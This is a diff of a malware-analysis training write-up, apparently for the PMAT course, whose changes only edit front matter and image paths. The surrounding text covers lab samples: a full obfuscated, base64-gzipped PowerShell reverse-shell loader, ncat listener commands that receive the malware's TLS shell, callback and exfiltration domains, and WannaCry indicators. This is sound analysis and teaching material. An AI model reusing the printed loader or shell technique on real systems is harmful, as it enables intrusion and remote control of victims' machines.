@@ -7,12 +7,6 @@ tags = [
    "Training",
    "PMAT"
 ]
-categories = [
-   "Malware",
-   "Training",
-   "PMAT"
-]
-series = ["PMAT"]
 +++
 
 # Practical Malware Analysis Training (PMAT) - TCM Security
@@ -92,11 +86,11 @@ There is a very fast opening and closing Powershell window visible by the user.
 
 It's visible using procmon with those filters:
 
-![](/img/pmat_procmon.png)
+![](/images/pmat_procmon.png)
 
 It's possible to extract the payload from the powershell command executed at runtime:
 
-![](/img/pmat_payload.png)
+![](/images/pmat_payload.png)
 
 ```
 powershell.exe -nop -w hidden -noni -ep bypass "&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAOW/UWECA51W227jNhB991cMXHUtIRbhdbdAESCLepVsGyDdNVZu82AYCE2NYzUyqZKUL0j87yUlypLjBNtUL7aGczlz5kL9AGOxQbkoOIRwK1OtkcN8B5/Mz6SQHCW8g0u6RvidymTX6RhNplPB4TfU4S3OWZYi19B57IB5vA2DC/iCm/Dr/G9kGsLJLscvdIVGqInRj0r9Wpn8qfASF7TIdCQxMScpzZRx4WlZ4EFrLMV2R55pGHlLUut29g3EvE6t8wjl+ZhKuvKr/9NYy5Tfz7xIrFaUJ/1jaawyJvgz4aXY8EzQpJQGzqcUDJUCR8BKJEWGFuCvfgCVSroAvw4DIf4D3XnKk25QHlZ2pW2WKkO/ofzChNyZ/ytiWYsFe0CtyITlN05j9suHDz+dGhKlqdQ2rotcnroSXbT0Roxhro3Dqhx+BWX/GlyJa5QKTxEfXLdK/hLyaOwCdeeCF2pImJC5kFRj+U7zPEsZtUUjmWA06/Ztgg5Vp2JWaYl0ZdOoohLTgXEpM/Ab4FXhKty2ibquTi3USmVx7ewV4MgKMww7Eteqvovf9xam27DvP3oT430PIVUwPbL5hiuhMUKp04XNCv+iWZqU2UU0y+aUPcyC4AU4ZFTope1nazRSb6QsaJW84arJtU3mdL7TOJ3NPPtrm3VAyHBgnqcfHwd7xzfypD72pxq3miBnIrGTcH4+iqPr68DW4JPV8bu3pqXFRlX7JF5iloEsODfaYBgqlGnrLpyBh3x9bt+4XQpnRmaKdThgYpUXujm845HIdzK9X2rwowCGg/c/wx8pk0KJhYbIUWJJgJGNaDUVSDQB1piQO37HXdc6Tohdcug32fUH/eaF3CC/18t2P9Uz3+6ok4Z6G1XTsxncGJeWG7cvyAHn27HWVp+FvKJsaTBXTiHlh33UaDWw7eMfrfGA1NlWG6/2FDxd87V4wPBqmxtuleH74GV/PKRvYqI3jqFn6lyiuBFVOwdkTPXSSHsfe/+7dJtlmqHve2k5A5X5N6SJX3V8HwZ98I7sAgg5wuCktlcWPiYTk8prV5tbHFaFlCleuZQbL2b8qYXS8ub2V0lznQ54afCsrcy2sFyeFADCekVXzocf372HJ/ha6LDyCo6KI1dDKAmpHRuSv1MC6DVOthaIh1IKOR3MjoK1UJfnhGVIpR+8hOCi/WIGf9s5naT/1D6Nm++OTrtVTgantvmcFWp5uLXdGnSXTZQJhS6f5h6Ntcjry9N8eXQOXxyH4rirE0J3L9kF8i/mtl93dQkAAA=='))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))"
@@ -195,7 +189,7 @@ powerfun -Command reverse -Sslcon true
 
 The DNS record that is queried at detonation is `bonus2.corporatebonusapplication.local`.
 
-![](/img/pmat_wireshark.png)
+![](/images/pmat_wireshark.png)
 
 **Q4. What is the callback port number at detonation?**
 
@@ -209,7 +203,7 @@ The callback protocol at detonation is TLS.
 
 Through TCPview or Procmon with the *Operation contains TCP* option.
 
-![](/img/pmat_tcpview.png)
+![](/images/pmat_tcpview.png)
 
 **Q7. Attempt to get the binary to initiate a shell on the localhost. Does a shell spawn? What is needed for a shell to spawn?**
 
@@ -242,7 +236,7 @@ We can trick the malware by adding `bonus2.corporatebonusapplication.local` on t
 
 Then execute `ipconfig /flushdns` to reset the DNS.
 
-![](/img/pmat_ncat.png)
+![](/images/pmat_ncat.png)
 
 ```
 PS C:\Windows\system32> ncat -nvlp 8443
@@ -261,7 +255,7 @@ Ncat: Connection from 127.0.0.1:49746.
 However, with `ncat -nvlp 8443` we can't interpret the data since it's encrypted over TLS.
 It's possible to decode it with `ncat` `--ssl` option.
 
-![](/img/pmat_ncat_ssl.png)
+![](/images/pmat_ncat_ssl.png)
 
 ```
 PS C:\Users\user> ncat --ssl -nvlp 8443
@@ -291,23 +285,23 @@ And now we get a shell from the malware ! It confirms our RAT suspicions.
 
 The binary is written in Nim. As we can see peid can't detect the compiler used for the file.
 
-![](/img/sikomode_peid.png)
+![](/images/sikomode_peid.png)
 
 However, with floss we find interesting strings, leading to NIM lang.
 
-![](/img/sikomode_nim.png)
+![](/images/sikomode_nim.png)
 
 greping into them confirm it with references to `NimMain`, `NimMainInner`, and `NimMainModule`
 
-![](/img/sikomode_nim2.png)
+![](/images/sikomode_nim2.png)
 
 **Q2. What is the architecture of this binary?**
 
 This is a PE64 binary file, which can be determined by PE-Studio or file command.  
 
-![](/img/sikomode_file.png)
+![](/images/sikomode_file.png)
 
-![](/img/sikomode_pe64.png)
+![](/images/sikomode_pe64.png)
 
 **Q3. Under what conditions can you get the binary to delete itself?**
 
@@ -321,7 +315,7 @@ The binary delete itself if:
 
 No persistence mechanism has been found.
 
-![](/img/sikomode_imports.png)
+![](/images/sikomode_imports.png)
 
 **Q5. What is the first callback domain?**
 
@@ -333,13 +327,13 @@ If the binary contacts the initial callback domain successfully, exfiltration oc
 
 References to `C:\Users\Public\passwrd.txt` and `Desktop\cosmo.jpeg`
 
-![](/img/sikomode_exfil.png)
+![](/images/sikomode_exfil.png)
 
 **Q7. What is the exfiltration domain?**
 
 `hxxp://cdn.altimiter.local` is the exfiltration domain.
 
-![](/img/sikomode_exfil.png)
+![](/images/sikomode_exfil.png)
 
 **Q8. What URI is used to exfiltrate data?**
 
@@ -368,11 +362,11 @@ The RC4 encryption key is `SikoMode` written in `C:\Users\Public\passwrd.txt`.
 
 - A wallpaper indicating that the computer is infected
 
-![](/img/wncry_wallpaper.jpg)
+![](/images/wncry_wallpaper.jpg)
 
 - A program with a countdown. It gives instruction how to pay the ransom in order to recover the encrypted files.
 
-![](/img/wncry_window.jpg)
+![](/images/wncry_window.jpg)
 
 - The files are encrypted with the `.WNCRY` extension.
 
@@ -382,7 +376,7 @@ The RC4 encryption key is `SikoMode` written in `C:\Users\Public\passwrd.txt`.
 
 There is a URL in the stackstring (built at runtime) `hxxp[://]www[.]iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]com`
 
-![](/img/wncry_str2.PNG)
+![](/images/wncry_str2.PNG)
 
  Other strings of interest include call to remote share : `\\192.168.56.20\IPC$`, `\\192.168.56.20\IPC$`. Files extensions, language pack `msg/m_french.wnry` and others :
 
@@ -397,9 +391,9 @@ WNcry@2ol7
 C:\%s\qeriuwjhrf
 ```
 
-![](/img/wncry_str3.PNG)
+![](/images/wncry_str3.PNG)
 
-![](/img/wncry_str4.PNG)
+![](/images/wncry_str4.PNG)
 
 **Q3. Inspect the import address table for the main WannaCry binary. Are there any notable API imports?**
 
@@ -433,15 +427,15 @@ If the connection is not successful (the domain is not reachable), the ransomwar
 
 - An hidden directory is created in `C:\ProgramData`. Contains the `taskhsvc.exe` and `tor.exe`.
 
-![](/img/wncry_str1.PNG)
+![](/images/wncry_str1.PNG)
 
-![](/img/wncry_folder.png)
+![](/images/wncry_folder.png)
 
 - A startup entry is created to start `tasksche.exe` as a persistent executable. There are also services `mssecsvc2.0` and `mvsmigybnoz504`
 
-![](/img/wncry_task.png)
+![](/images/wncry_task.png)
 
-![](/img/wncry_services.png)
+![](/images/wncry_services.png)
 
 **Q7. Use Cutter to locate the killswitch mechanism in the decompiled code and explain how it functions.**
 
